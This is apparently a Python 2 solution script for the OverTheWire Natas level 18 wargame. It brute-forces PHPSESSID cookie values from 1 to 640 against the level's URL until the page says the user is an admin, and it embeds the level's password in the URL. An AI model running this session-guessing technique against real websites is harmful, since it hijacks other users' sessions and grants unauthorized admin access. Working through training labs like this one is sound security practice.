import requests

target = 'http://natas18:xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP@natas18.natas.labs.overthewire.org'

successfulStr = 'You are an admin.'

for i in range(1,641):
	cookie = {'PHPSESSID':str(i)}
	r = requests.get(target,cookies=cookie)
	print i
	if r.text.find(successfulStr) != -1 :
		print 'Done'
		print r.text
		break